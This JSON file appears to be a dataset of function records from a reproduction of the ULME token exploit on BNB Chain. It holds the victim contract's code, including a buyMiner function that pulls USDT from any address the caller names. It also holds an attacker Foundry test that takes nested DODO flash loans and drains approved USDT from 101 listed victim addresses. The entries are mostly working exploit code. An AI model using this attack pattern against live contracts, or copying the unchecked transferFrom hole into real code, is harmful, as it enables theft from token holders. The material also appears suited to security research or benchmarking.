[
  {
    "contract/interface": "IULME",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "    function allowance(address owner, address spender) public view returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IULME",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint value) external returns (bool) {\n        _approve(msg.sender, spender, value);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IULME",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address account) public view returns (uint256) {\n        return _balances[account];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IULME",
    "source_type": "victim_contract",
    "function_name": "buyMiner",
    "original_code": "    function buyMiner(address user,uint256 usdt)public returns (bool){\n        address[]memory token=new address[](2);\n        token[0]=_usdt_token;\n        token[1]=address(this);\n        usdt=usdt.add(usdt.div(10));\n        require(IERC20(_usdt_token).transferFrom(user,address(this),usdt), \"buyUlm: transferFrom to ulm error\");\n        uint256 time=sale_date;\n        sale_date=0;\n        address k=0x25812c28CBC971F7079879a62AaCBC93936784A2;\n        IUniswapV2Router01(_roter).swapExactTokensForTokens(usdt,1000000,token,k,block.timestamp+60);\n        IUniswapV2Router01(k).transfer(address(this),address(this),IERC20(address(this)).balanceOf(k));\n        sale_date=time;\n        return true;\n    }\n}\n\ncontract UniverseGoldMountain is ERC20, ERC20Detailed,ERC20Mintable {\n    constructor(address dis) public ERC20Detailed(\"ULME\", \"ULME\", 18) ERC20Mintable(dis){\n        uint256 totalSupply =18964990000* (10**uint256(18));\n        _mint(address(this), totalSupply );\n        _mint(dis, 345010000* (10**uint256(18)) );\n        addMinter(dis);\n    }\n    \n}\n",
    "description": ""
  },
  {
    "contract/interface": "IULME",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "    function decimals() public view returns (uint8) {\n        return _decimals;\n    }\n\n}\n\n",
    "description": ""
  },
  {
    "contract/interface": "IULME",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IULME",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "    function name() public view returns (string memory) {\n        return _name;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IULME",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IULME",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "    function symbol() public view returns (string memory) {\n        return _symbol;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IULME",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "    function totalSupply() public view returns (uint256) {\n        return _totalSupply;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IULME",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address to, uint value) external returns (bool) {\n        _transfer(msg.sender, to, value);\n        return true;\n    }\n\n    function transferFrom(address from, address to, uint value) external returns (bool) {\n        if (allowance[from][msg.sender] != uint(-1)) {\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);\n        }\n        _transfer(from, to, value);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IULME",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(address from, address to, uint value) external returns (bool) {\n        if (allowance[from][msg.sender] != uint(-1)) {\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);\n        }\n        _transfer(from, to, value);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IULME",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "DPPFlashLoanCall",
    "original_code": "    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        if (msg.sender == dodo1) {\n            dodo2Balance = USDT.balanceOf(dodo2);\n            emit log_named_decimal_uint(\"[Callback 1] borrowing from dodo2\", dodo2Balance, USDT.decimals());\n            DVM(dodo2).flashLoan(0, dodo2Balance, address(this), data);\n            emit log_named_decimal_uint(\n                \"[Callback 1] Attacker USDT Balance after 1st repay\", USDT.balanceOf(address(this)), USDT.decimals()\n            );\n            USDT.transfer(dodo1, dodo1Balance);\n            emit log_named_decimal_uint(\n                \"[Callback 1] Attacker USDT Balance after 2nd repay\", USDT.balanceOf(address(this)), USDT.decimals()\n            );\n        }\n        if (msg.sender == dodo2) {\n            emit log_named_decimal_uint(\n                \"[Callback 2] Attacker USDT Balance at start\", USDT.balanceOf(address(this)), USDT.decimals()\n            );\n            emit log_named_decimal_uint(\n                \"[Callback 2] Attacker ULME Balance at start\", ULME.balanceOf(address(this)), ULME.decimals()\n            );\n\n            USDTToULME();\n\n            emit log_named_decimal_uint(\n                \"[Callback 2] Attacker USDT Balance after frontrun swap\", USDT.balanceOf(address(this)), USDT.decimals()\n            );\n            emit log_named_decimal_uint(\n                \"[Callback 2] Attacker ULME Balance after frontrun swap\", ULME.balanceOf(address(this)), ULME.decimals()\n            );\n\n            address[] memory victims = abi.decode(data, (address[]));\n            uint256 numOfVictims = victims.length;\n            uint256 amount = 0;\n            for (uint256 i = 0; i < numOfVictims; ++i) {\n                uint256 balance = USDT.balanceOf(address(victims[i]));\n                uint256 allowance = USDT.allowance(address(victims[i]), address(ULME));\n                uint256 take = balance;\n                if (balance > allowance) {\n                    take = allowance;\n                }\n\n                if (take / 1 ether > 1) {\n                    emit log_named_address(\"mining from\", victims[i]);\n                    emit log_named_decimal_uint(\"available for swap\", take, USDT.decimals());\n                    try ULME.buyMiner(victims[i], 100 * take / 110 - 1) {\n                        amount += take;\n                    } catch {\n                        emit log_named_address(\"bad victim\", victims[i]);\n                    }\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheat.label(address(ULME_BUSD_LPPool), \"ULME_BUSD_LPPool\");\n        cheat.label(address(pancakeRouter), \"pancakeRouter\");\n        cheat.label(address(USDT), \"USDT\");\n        cheat.label(address(ULME), \"ULME\");\n\n        cheat.createSelectFork(\"bsc\", 22_476_695);\n        console.log(\"-------------------------------- Start Attacker ----------------------------------\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        USDT.approve(address(pancakeRouter), type(uint256).max);\n        ULME.approve(address(pancakeRouter), type(uint256).max);\n\n        emit log_named_decimal_uint(\"[Start] Attacker USDT Balance\", USDT.balanceOf(address(this)), 18);\n        emit log_named_decimal_uint(\"[Start] Attacker ULME Balance\", ULME.balanceOf(address(this)), 18);\n\n        // addresses attacked by the hacker\n        address[] memory victims = new address[](101);\n        victims[0] = 0x4A005e5E40Ce2B827C873cA37af77e6873e37203;\n        victims[1] = 0x5eCe8A3382FD5317EBa6670cAe2F70ccA8845859;\n        victims[2] = 0x065D5Bfb0bdeAdA1637974F76AcF54428D61c45d;\n        victims[3] = 0x0C678244aaEd33b6c963C2D6B14950d35EAB899F;\n        victims[4] = 0x1F0D9584bC8729Ec139ED5Befe0c8677994FcB35;\n        victims[5] = 0x6b8cdC12e9E2F5b3620FfB12c04C5e7b0990aaf2;\n        victims[6] = 0xA9882080e01F8FD11fa85F05f7c7733D1C9837DF;\n        victims[7] = 0x1dFBBECc9304f73caD14C3785f25C1d1924ACB0B;\n        victims[8] = 0x0b038F3e5454aa745Ff029706656Fed638d5F73a;\n        victims[9] = 0x0Bd084decfb04237E489cAD4c8A559FC5ce44f90;\n        victims[10] = 0x5EB2e4907f796C9879181041fF633F33f8858d93;\n        victims[11] = 0x0DE272Ef3273d49Eb608296A783dBd36488d3989;\n        victims[12] = 0xAe800360ac329ceA761AFDa2d3D55Bd12932Ab62;\n        victims[13] = 0xf7726cA96bF1Cee9c6dC568ad3A801E637d10076;\n        victims[14] = 0x847aA967534C31b47d46A2eEf5832313E36b25E2;\n        victims[15] = 0x6c91DA0Dc1e8ab02Ab1aB8871c5aE312ef04273b;\n        victims[16] = 0xb14018024600eE3c747Be98845c8536994D40A5D;\n        victims[17] = 0x8EcdD8859aA286c6bae1f570eb0105457fD24cd2;\n        victims[18] = 0x6ff1c499C13548ee5C9B1EA6d366A5E11EcA60ca;\n        victims[19] = 0xC02eb88068A40aEe6E4649bDc940e0f792e16C22;\n        victims[20] = 0xa2D5b4de4cb10043D190aae23D1eFC02E31F1Cb6;\n        victims[21] = 0x5E05B8aC4494476Dd539e0F4E1302806ec52ED6F;\n        victims[22] = 0xDeb6FDCa49e54c8b0704C5B3f941ED6319139816;\n        victims[23] = 0x0E6533B8d6937cC8b4c9be31c00acBfaCB6760a5;\n        victims[24] = 0xCE0Fd72a7cF07EB9B20562bbb142Cb711A42867f;\n        victims[25] = 0x4868725bf6D395148def99E6C43074C774e7AC1D;\n        victims[26] = 0x2F1f2BAF34703d16BcfD62cF64A7A5a44Ad6c9d4;\n        victims[27] = 0x3d49Bdf065f009621A02c5Fd88f72ed0A3910521;\n        victims[28] = 0x6E31C08f1938BE5DF98F8968747bB34802D76E50;\n        victims[29] = 0x4F741D8DCDEdd74DadeA6cd3A7e41ECb28076209;\n        victims[30] = 0x5480c14b9841C89527F0D1A55dDC0D273Aae3609;\n        victims[31] = 0xb3725dA113eFFd7F39BE62A5E349f26e82a949fF;\n        victims[32] = 0x9d83Dee089a5fBfB5F2F1268EDB80aeA8Ba5aF16;\n        victims[33] = 0x0c02F3d6962245E934A3fe415EAbA6bf570c1883;\n        victims[34] = 0x0182cfEFB268DD510ee77F32527578BEAC6238e2;\n        victims[35] = 0x78598Ac3943454682477852E846532F73d5cFE5F;\n        victims[36] = 0xd067c7585425e1e5AA98743BdA5fB65212751476;\n        victims[37] = 0x3507ddF8b74dAEd03fE76EE74B7d6544F3B254B7;\n        victims[38] = 0xEca4Fd6b05E5849aAf5F2bEE5Eb3B50f8C4f4E3c;\n        victims[39] = 0xAA279af072080f3e453A916b77862b4ff6eB245E;\n        victims[40] = 0x4e505a21325A6820E2099Bbd15f6832c6f696a3c;\n        victims[41] = 0xA5b63F7b40A5Cc5ee6B9dB7cef2415699627Ee89;\n        victims[42] = 0x3dd624cEd432DDc32fA0afDaE855b76aa1431644;\n        victims[43] = 0x17f217Fdeff7Ee4a81a4b2f42c695EDC20806957;\n        victims[44] = 0x41819F36878d15A776225928CD52DC56acCFD553;\n        victims[45] = 0x61ca76703C5aF052c9b0aCc2Bab0276875DDd328;\n        victims[46] = 0x2956bCc87450B424C7305C4c6CF771196c23A52E;\n        victims[47] = 0x03be05224803c89f3b8C806d887fD84A20D16e5C;\n        victims[48] = 0x3C97320bf030C2c120FdCe19023A571f3fbB6184;\n        victims[49] = 0xc52021150ca5c32253220bE328ddC05F86d3a619;\n        victims[50] = 0x6d7aAa35c4B2dBD6F1E979e04884AeE1B4FBB407;\n        victims[51] = 0x7c80162197607312EC99d7c9e34720B3572d6D16;\n        victims[52] = 0x15D92C909826017Ff0184eea3e38c36489517A7C;\n        victims[53] = 0xC07fa7a1F14A374d169Dc593261843B4A6d9C1C3;\n        victims[54] = 0x4b415F48FA70a9a0050F6380e843790260973808;\n        victims[55] = 0x9CeEeB927b85d4bD3b4e282c17EB186bCDC4Dd15;\n        victims[56] = 0x0eb76DAf60bdF637FC207BFb545B546D5Ee208B1;\n        victims[57] = 0x96D7F1660e708eDdF2b6f655ADB61686B59bC190;\n        victims[58] = 0xDCeB637E38dBae685222eEf6635095AaaEC65496;\n        victims[59] = 0x36083Aac533353317C24Bd53227DbF29Ed9F384c;\n        victims[60] = 0x94913f31fBaFcb0ae6e5EfA4C18E3ee301097eab;\n        victims[61] = 0x188c50F43f9fA0026BAaa7d8cF83c358311f0500;\n        victims[62] = 0x3d8dcC70777643612564D84176f769A1417987a5;\n        victims[63] = 0x00273CEEe956543c801429A886cD0E1a79f5d8cA;\n        victims[64] = 0xC43C5F785D06b582E3E710Dc0156267Fd135C602;\n        victims[65] = 0x0406aefd83f20700D31a49F3d6fdbF52e8F7D0Ef;\n        victims[66] = 0xBeD8C7433dE90D349f96C6AE82d4eb4482AA6Bf7;\n        victims[67] = 0xDe436F7742cE08f843f8d84e7998E0B7e4b73101;\n        victims[68] = 0xd38c6E26aa4888DE59C2EAaD6138B0b66ABBF21D;\n        victims[69] = 0xc0dFb3219F0C72E902544a080ba0086da53F9599;\n        victims[70] = 0xFAAD61bd6b509145c2988B03529fF21F3C9970B2;\n        victims[71] = 0x9f9BEEF87Cfe141868E21EacbDDB48DF6c54C2F2;\n        victims[72] = 0x6614e2e86b4646793714B1fa535fc5875bB446d5;\n        victims[73] = 0x7eFe3780b1b0cde8F300443fbb4C12a73904a948;\n        victims[74] = 0xAd813b95A27233E7Abd92C62bBa87f59Ca8F9339;\n        victims[75] = 0x13F33854cE08e07D20F5C0B16884267dde21a501;\n        victims[76] = 0x59ebcde7Ec542b5198095917987755727725fD1d;\n        victims[77] = 0xe5A5B86119BD9fd4DF5478AbE1d3D9F46BF3Ba5F;\n        victims[78] = 0xC2724ed2B629290787Eb4A91f00aAFE58F262025;\n        victims[79] = 0xDFa225eB03F9cc2514361A044EDDA777eA51b9ad;\n        victims[80] = 0x85d981E3CDdb402F9Ae96948900971102Ee5d6b5;\n        victims[81] = 0xb0Ac3A88bFc919cA189f7d4AbA8e2F191b37A65B;\n        victims[82] = 0x1A906A9A385132D6B1a62Bb8547fD20c38dd79Bb;\n        victims[83] = 0x9d36C7c400e033aeAc391b24F47339d7CB7bc033;\n        victims[84] = 0x5B19C1F57b227C67Bef1e77b1B6796eF22aEe21B;\n        victims[85] = 0xbfd0785a924c3547544C95913dAC0b119865DF9e;\n        victims[86] = 0xF003E6430fbC1194ffA3419629A389B7C113F083;\n        victims[87] = 0xfa30Cd705eE0908e2Dac4C19575F824DED99818E;\n        victims[88] = 0xe27027B827FE2FBcFCb56269d4463881AA6B8955;\n        victims[89] = 0xEddD7179E461F42149104DCb87F3b5b657a05399;\n        victims[90] = 0x980FcDB646c674FF9B6621902aCB8a4012974093;\n        victims[91] = 0x2eBc77934935980357A894577c2CC7107574f971;\n        victims[92] = 0x798435DE8fA75993bFC9aD84465d7F812507b604;\n        victims[93] = 0x1Be117F424e9e6f845F7b07C072c1d67F114f885;\n        victims[94] = 0x434e921bDFe74605BD2AAbC2f6389dDBA2d37ACA;\n        victims[95] = 0xaFacAc64426D1cE0512363338066cc8cABB3AEa2;\n        victims[96] = 0x2693e0A37Ea6e669aB43dF6ee68b453F6D6F3EBD;\n        victims[97] = 0x77Aee2AAc9881F4A4C347eb94dEd088aD49C574D;\n        victims[98] = 0x951f4785A2A61fe8934393e0ff6513D6946D8d97;\n        victims[99] = 0x2051cE514801167545E74b5DD2a8cF5034c6b17b;\n        victims[100] = 0xC2EE820756d4074d887d762Fd8F70c4Fc47Ab47f;\n\n        dodo1Balance = USDT.balanceOf(dodo1);\n        emit log_named_decimal_uint(\"[before 1st flashloan] borrowing from dodo1\", dodo1Balance, USDT.decimals());\n        DVM(dodo1).flashLoan(0, dodo1Balance, address(this), abi.encode(victims));\n\n        console.log(\"-------------------------------- End Exploit ----------------------------------\");\n        emit log_named_decimal_uint(\"[End] Attacker USDT Balance\", USDT.balanceOf(address(this)), USDT.decimals());\n        emit log_named_decimal_uint(\"[End] Attacker ULME Balance\", ULME.balanceOf(address(this)), ULME.decimals());\n    }\n\n",
    "description": ""
  }
]